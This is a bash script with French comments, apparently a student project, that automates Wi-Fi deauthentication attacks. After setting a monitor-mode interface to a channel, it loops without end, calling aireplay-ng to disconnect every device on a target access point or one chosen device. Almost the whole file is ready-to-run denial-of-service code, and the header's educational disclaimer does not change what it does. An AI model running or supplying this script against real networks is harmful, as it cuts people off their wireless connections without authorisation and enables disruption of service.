#!/bin/bash
#
#==============================================================================
# Title          : auto_deauth.sh
# Description    : Script pour automatiser des attaques de désauthentification
#                  sur un réseau Wi-Fi en utilisant des outils de cybersécurité.
# Author         : rrtracer
# Date           : 2024-10-10
# Version        : 1.0
# License        : GPL-3.0
# Usage          : ./auto_deauth.sh [options]
# Bash Version   : 5.0+
#==============================================================================
# 
# Ce script a été conçu dans le cadre de mes études supérieures en cybersécurité
# Il permet d'automatiser une attaque de désauthentification (Deauthentication)
# sur un réseau sans fil en utilisant des outils comme aircrack-ng. Il est
# recommandé d'utiliser ce script uniquement dans un cadre légal, éducatif, ou
# de test avec une autorisation explicite. Toute utilisation illégale est
# strictement interdite et peut entraîner des sanctions sévères.
#
#------------------------------------------------------------------------------
# Pré-requis :
#   - Avoir installé le package aircrack-ng.
#   - Posséder une carte Wi-Fi compatible avec le mode monitor.
#   - Droits d'exécution root (sudo).
#
# Options :
#   -i  : Interface Wi-Fi en mode monitor (ex : wlan0mon).
#   -c  : Canal du réseau cible.
#   -b  : Adresse MAC (BSSID) du routeur cible.
#   -d  : Adresse MAC de l'appareil cible (facultatif, sinon attaque sur tous
#         les appareils).
#
# Exemples :
#   ./auto_deauth.sh -i wlan0mon -c 6 -b 00:11:22:33:44:55
#   ./auto_deauth.sh -i wlan0mon -c 11 -b 66:77:88:99:AA:BB -d AA:BB:CC:DD:EE:FF
#
#------------------------------------------------------------------------------
# Attention : 
# - Ce script est conçu à des fins pédagogiques et doit être utilisé
#   conformément aux lois en vigueur.
#==============================================================================

# Vérification des privilèges root
if [[ $EUID -ne 0 ]]; then
  echo "Ce script doit être exécuté avec des privilèges root (sudo)." 1>&2
  exit 1
fi

# Variables par défaut
target_device=""
channel=""

# Fonction d'affichage de l'aide
function usage() {
  echo "Usage : $0 -i <interface> -c <canal> -b <BSSID> [-d <MAC de la cible>]"
  echo "  -i  : Interface en mode monitor (ex: wlan0mon)"
  echo "  -c  : Canal du réseau cible"
  echo "  -b  : BSSID du point d'accès cible"
  echo "  -d  : MAC de l'appareil cible (facultatif)"
  exit 1
}

# Lecture des arguments
while getopts ":i:c:b:d:" opt; do
  case $opt in
    i) interface=$OPTARG ;;
    c) channel=$OPTARG ;;
    b) bssid=$OPTARG ;;
    d) target_device=$OPTARG ;;
    *) usage ;;
  esac
done

# Vérification que les arguments obligatoires sont fournis
if [[ -z "$interface" || -z "$channel" || -z "$bssid" ]]; then
  usage
fi

# Mise en place du canal sur l'interface
echo "[*] Configuration de l'interface $interface sur le canal $channel..."
iwconfig $interface channel $channel

# Boucle infinie pour envoyer des paquets de désauthentification en continu
while true; do
  if [[ -z "$target_device" ]]; then
    # Désauthentification de tous les appareils connectés au réseau
    echo "[*] Envoi des paquets de désauthentification à tous les appareils sur le réseau $bssid..."
    aireplay-ng --deauth 10 -a $bssid $interface
  else
    # Désauthentification d'un appareil spécifique
    echo "[*] Envoi des paquets de désauthentification à l'appareil $target_device sur le réseau $bssid..."
    aireplay-ng --deauth 10 -a $bssid -c $target_device $interface
  fi
  # Pause avant de relancer l'attaque
  sleep 2
done